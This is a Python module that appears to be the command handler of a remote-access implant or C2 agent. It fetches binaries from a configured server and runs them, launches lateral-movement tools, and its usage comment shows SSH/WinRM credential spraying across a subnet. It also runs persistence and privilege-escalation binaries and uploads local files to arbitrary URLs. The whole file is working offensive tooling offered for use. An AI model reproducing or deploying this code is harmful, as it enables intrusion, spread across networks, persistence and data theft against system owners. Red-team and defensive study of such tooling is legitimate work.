"""Plugin handlers for special commands"""



import subprocess

import os

import urllib.request

import urllib.error

from pathlib import Path

from datetime import datetime

import signal



import config   # Import centralized configuration





def log_event(message: str):

    """Append log entry to log.txt with timestamp."""

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:

        with open(config.LOG_FILE, "a", encoding="utf-8") as f:

            f.write(f"[{timestamp}] {message}\n")

    except Exception:

        pass  # Fail silently if logging fails





def ensure_on_demand_directory():

    """Create the on-demand plugins directory."""

    os.makedirs(config.ON_DEMAND_DIR, exist_ok=True)





# ====================== LATERAL MOVEMENT ======================



def lateral_movement_binary(binary_path: str = None, args: list = None, output_file: str = "lateral_output.txt") -> str:

    """

    Run lateral movement binary with arguments.

    Uses default binary from config if none provided.

    """

    if args is None:

        args = []

    

    # Use default binary from config if not specified

    if not binary_path:

        binary_path = config.LATERAL_MOVEMENT_BINARY



    try:

        command = [binary_path] + args

        output_path = Path(output_file)



        print(f"[Lateral] Running: {' '.join(command)}")

        log_event(f"Lateral movement started â†’ {' '.join(command)}")



        with open(output_path, "w", encoding="utf-8") as outfile:

            result = subprocess.run(

                command,

                stdout=outfile,

                stderr=subprocess.PIPE,

                text=True,

                timeout=90

            )



        if result.returncode != 0:

            error_msg = f"Binary failed with code {result.returncode}: {result.stderr.strip()}"

            log_event(f"Lateral movement failed: {error_msg}")

            return error_msg



        content = output_path.read_text(encoding="utf-8")

        log_event(f"Lateral movement completed. Output saved to {output_file}")

        return content



    except FileNotFoundError:

        msg = f"Binary not found: {binary_path}"

        log_event(f"Lateral movement error: {msg}")

        return msg

    except subprocess.TimeoutExpired:

        msg = "Lateral movement timed out after 90 seconds"

        log_event(f"Lateral movement error: {msg}")

        return msg

    except Exception as e:

        msg = f"Error in lateral_movement: {e}"

        log_event(f"Lateral movement error: {msg}")

        return msg





# ====================== OTHER PLUGIN HANDLERS ======================



def handle_plugin_download(command: str) -> str:

    """Handle: plugin_download:filename"""

    try:

        _, filename = command.split(":", 1)

        filename = filename.strip()

        if not filename:

            return "ERROR: No filename provided after plugin_download:"



        ensure_on_demand_directory()

        download_url = config.DOWNLOAD_BASE_URL + filename

        save_path = os.path.normpath(os.path.join(config.ON_DEMAND_DIR, filename))



        log_event(f"Downloading plugin: {filename} from {download_url}")



        urllib.request.urlretrieve(download_url, save_path)

        os.chmod(save_path, 0o755)



        log_event(f"Plugin downloaded successfully: {filename}")

        return f"Plugin downloaded successfully: {filename}"



    except Exception as e:

        log_event(f"Download failed: {e}")

        return f"ERROR: Download failed - {e}"



'''

def handle_plugin_run(command: str) -> str:

    """Handle: plugin_run:filename"""

    try:

        _, filename = command.split(":", 1)

        filename = filename.strip()

        if not filename:

            return "ERROR: No filename provided after plugin_run:"



        ensure_on_demand_directory()

        binary_path = os.path.normpath(os.path.join(config.ON_DEMAND_DIR, filename))



        if not os.path.isfile(binary_path):

            return f"ERROR: Binary not found: {binary_path}"



        log_event(f"Running on-demand plugin: {filename}")



        result = subprocess.run(

            [binary_path],

            capture_output=True,

            text=True,

            check=True,

            timeout=60

        )

        log_event(f"Plugin run completed: {filename}")

        return f"Plugin executed successfully: {filename}\n{result.stdout}"



    except Exception as e:

        log_event(f"Plugin run failed: {e}")

        return f"ERROR: {e}"

'''





# golang binaries throw an error when run with the commented out code above so I fixed it with this CODE

def handle_plugin_run(command: str) -> str:

    """Handle: plugin_run:filename"""

    try:

        _, filename = command.split(":", 1)

        filename = filename.strip()

        

        if not filename:

            return "ERROR: No filename provided after plugin_run:"



        ensure_on_demand_directory()

        

        binary_path = os.path.normpath(os.path.join(config.ON_DEMAND_DIR, filename))

        

        if not os.path.isfile(binary_path):

            return f"ERROR: Binary not found: {binary_path}"

        

        if not os.access(binary_path, os.X_OK):

            return f"ERROR: Binary is not executable: {filename}"



        log_event(f"Running on-demand plugin: {filename}")



        # Improved subprocess configuration

        result = subprocess.run(

            [binary_path],

            capture_output=True,

            text=True,

            check=False,                    # Don't raise on non-zero exit

            timeout=120,                    # Increased to 2 minutes

            stdin=subprocess.DEVNULL,       # Prevent hanging on input

            cwd=config.ON_DEMAND_DIR,       # Run from correct directory

            env=os.environ.copy(),          # Pass environment variables

            preexec_fn=os.setsid            # New process group (better kill control)

        )



        log_event(f"Plugin finished: {filename} | Return code: {result.returncode}")



        output = result.stdout.strip()

        error_output = result.stderr.strip()



        if result.returncode == 0:

            return f"Plugin executed successfully: {filename}\n{output}"

        else:

            return (f"Plugin failed (code {result.returncode}): {filename}\n"

                    f"STDOUT: {output}\n"

                    f"STDERR: {error_output}")



    except subprocess.TimeoutExpired:

        # Kill the process group if it times out

        try:

            os.killpg(os.getpgid(result.pid), signal.SIGTERM)

        except:

            pass

        log_event(f"Plugin timed out: {filename}")

        return f"ERROR: Plugin '{filename}' timed out after 120 seconds"



    except Exception as e:

        log_event(f"Plugin run failed: {e}")

        return f"ERROR: Failed to run plugin: {str(e)}"



def handle_persist_command() -> str:

    """Handle persist command."""

    script_dir = os.path.dirname(os.path.abspath(__file__))

    binary_path = os.path.normpath(os.path.join(script_dir, config.PERSIST_BINARY))

    try:

        subprocess.run([binary_path], capture_output=True, text=True, check=True)

        return "Persisted on startup"

    except Exception as e:

        return f"Error persisting: {e}"





def handle_priv_esc_command() -> str:

    """Handle privilege escalation command."""

    script_dir = os.path.dirname(os.path.abspath(__file__))

    binary_path = os.path.normpath(os.path.join(script_dir, config.PRIV_ESC_BINARY))

    try:

        subprocess.run([binary_path], capture_output=True, text=True, check=True)

        return "Priv esc successful"

    except Exception as e:

        return f"Error during priv esc: {e}"

        

# ====================== MISC FILE DOWNLOAD ======================

def handle_download_command(command: str) -> str:

    """Handle: download http://127.0.0.1:5000 ./some_folder/to/save/the/file/to/example.txt"""

    try:

        parts = command.strip().split(maxsplit=2)

        if len(parts) < 3:

            return "ERROR: Invalid download command. Usage: download <url> <save_path>"



        _, url, path = parts

        url = url.strip()

        path = path.strip()



        if not url:

            return "ERROR: No URL provided after download:"

        if not path:

            return "ERROR: No path to save on disk provided after download URL:"



        import requests



        try:

            log_event(f"Downloading file from: {url}")

            response = requests.get(url)



            with open(path, "wb") as f:

                f.write(response.content)



            log_event(f"File downloaded successfully: {path}")

            return f"File downloaded successfully: {path}"



        except FileNotFoundError:

            return f"ERROR: Could not save file to: {path}"

        except Exception as e:

            log_event(f"Error saving downloaded file: {e}")

            return "File downloaded but could not save to disk"



    except Exception as e:

        log_event(f"Download failed: {e}")

        return f"ERROR: Download failed - {e}"





# ====================== MISC FILE UPLOAD ======================

def handle_upload_command(command: str) -> str:

    """Handle: upload http://127.0.0.1:5000/upload example.txt"""

    try:

        parts = command.strip().split(maxsplit=2)

        if len(parts) < 3:

            return "ERROR: Invalid upload command. Usage: upload <url> <local_file_path>"



        _, url, path = parts

        url = url.strip()

        path = path.strip()



        if not url:

            return "ERROR: No URL provided after upload command:"

        if not path:

            return "ERROR: No file name to upload provided after upload URL:"



        import os

        import requests



        # === Debugging Info ===

        abs_path = os.path.abspath(path)

        log_event(f"Upload requested - File: '{path}' | Absolute: '{abs_path}' | CWD: '{os.getcwd()}'")



        if not os.path.exists(path):

            return f"ERROR: File not found: {path} (Absolute path: {abs_path})"



        if not os.path.isfile(path):

            return f"ERROR: Path exists but is not a file: {path}"



        try:

            with open(path, 'rb') as f:

                files = {'upload_file': f}

                log_event(f"Starting upload to {url}")

                r = requests.post(url, files=files)



            if r.status_code == 201:

                log_event("File successfully uploaded")

                return "File successfully uploaded"

            else:

                log_event(f"Upload failed with status: {r.status_code} - Response: {r.text[:200]}")

                return f"Upload failed with status code: {r.status_code}"



        except Exception as e:

            log_event(f"Error during upload request: {e}")

            return f"File could not be uploaded - {str(e)[:100]}"



    except Exception as e:

        log_event(f"Error: Operation failed - {e}")

        return f"ERROR: Operation failed - {e}"

        

	



# ====================== COMMAND DISPATCHER ======================



def is_special_command(command: str) -> bool:

    """Check if command should be handled by plugins."""

    cmd = command.lower()

    return any(cmd.startswith(prefix) for prefix in [

        "persist", "priv_esc", "plugin_download", "plugin_run", "lateral_movement", "upload", "download"

    ])





def execute_special_command(command: str) -> str:

    """Main dispatcher with logging."""

    log_event(f"execute_special_command called with: {command}")



    cmd_lower = command.lower()



    if cmd_lower.startswith("plugin_download"):

        return handle_plugin_download(command)



    elif cmd_lower.startswith("plugin_run"):

        return handle_plugin_run(command)



    elif cmd_lower.startswith("lateral_movement"):

        '''

        How to Use Lateral Movement Now:



        Using default binary (recommended):textlateral_movement:-pr:ssh winrm:-uf:username.txt:-pf:password.txt:192.168.1.1-254

        Using custom binary:textlateral_movement:./custom_tool:-t:targetlist.txt

        '''

        try:

            # Format: lateral_movement:binary_path:arg1:arg2:arg3...

            parts = command.split(":", 1)

            if len(parts) < 2:

                # Use default binary from config with no args

                return lateral_movement_binary()



            arg_string = parts[1].strip()

            arg_list = [x.strip() for x in arg_string.split(":") if x.strip()]



            if not arg_list:

                return lateral_movement_binary()



            binary_path = arg_list[0] if arg_list[0] else None

            args = arg_list[1:] if len(arg_list) > 1 else []



            return lateral_movement_binary(binary_path=binary_path, args=args)



        except Exception as e:

            log_event(f"Failed to parse lateral_movement: {e}")

            return f"ERROR parsing lateral_movement command: {e}"



    elif cmd_lower.startswith("persist"):

        return handle_persist_command()



    elif cmd_lower.startswith("priv_esc"):

        return handle_priv_esc_command()

    elif cmd_lower.startswith("download"):

        return handle_download_command(command)  

    elif cmd_lower.startswith("upload"):

        return handle_upload_command(command)            



    return "Unknown special command"

